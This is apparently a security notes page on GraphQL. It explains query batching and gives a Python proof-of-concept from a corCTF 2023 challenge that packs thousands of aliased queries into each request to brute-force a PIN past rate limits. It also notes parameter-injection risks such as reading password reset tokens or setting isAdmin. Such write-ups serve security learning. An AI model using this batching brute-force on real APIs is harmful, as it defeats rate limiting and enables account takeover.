---
title: "GraphQL"
description: "Overview of GraphQL"
lead: "Overview of GraphQL"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "server-side"
weight: 620
toc: true
---

## Definition

[GraphQL](https://graphql.org/) is a query language for APIs and a runtime for executing those queries, enabling clients to request exactly the data they need and nothing more, often used to improve performance and flexibility over traditional REST APIs.

- `query`: Read data
- `mutation`: Write or delete data

## GraphQL Batching

**GraphQL batching** allows clients to **combine multiple GraphQL queries into a single request**. Instead of making several individual requests, clients can bundle multiple queries together and send them to the server in one HTTP POST request. The server then processes these queries together and returns a batched response with the requested data.

This can be used to bypass HTTP rate limiting. Example with the write up of the challenge: `corCTF 2023 - web/force`:

{{< details "GraphQL Batching - Example PoC" >}}
```python
import requests
import random
from string import ascii_letters


URL = "https://web-force-force-2c910d4f6aa5eee1.be.ax"
MAX_CONCURENT = 10_000
QUERY = "$RANDOM$:flag(pin: $PAYLOAD$)"


def random_name():
    """Generates a random key for the GraphQL query"""
    return "".join(random.choice(ascii_letters) for i in range(8))

def check_sucess(resp, tasks):
    """Checks if the response contains the flag"""
    data = resp.json()["data"]

    for key, value in data.items():
        if value != "Wrong!":
            print(tasks[key], value)
            return True
    return False

def brute_force():
    """Brute force using GraphQL batching"""
    tasks = {}
    i = 0

    while i < 10 ** 5:
        payload = "{"
        for _ in range(0, MAX_CONCURENT):
            random_key = random_name() 
            guess_value = str(i)
            tasks[random_key] = guess_value

            payload += " " + QUERY.replace("$RANDOM$", random_key).replace("$PAYLOAD$", guess_value)
            i += 1
        payload += " }"

        resp = requests.post(
            URL,
            headers={"Content-Type": "text/plain;charset=UTF-8"},
            data=payload,
            proxies={
                "http": "127.0.0.1:8080",
                "https": "127.0.0.1:8080"
            },
            verify=False
        )

        if check_sucess(resp, tasks):
            return

if __name__ == "__main__":
    brute_force()
```
{{< /details >}}

## Inputs/Outputs scope

Injecting extra parameters can result in unauthorized activities, such as:
- In **queries**, it can lead to accessing additional information, like obtaining password hashes or password reset tokens.
- In **mutations**, it might involve altering parameters, like setting an `isAdmin` field to `true`.

## Tools

- [GraphQL Voyager](https://graphql-kit.com/graphql-voyager/): Represent any GraphQL API as an interactive graph.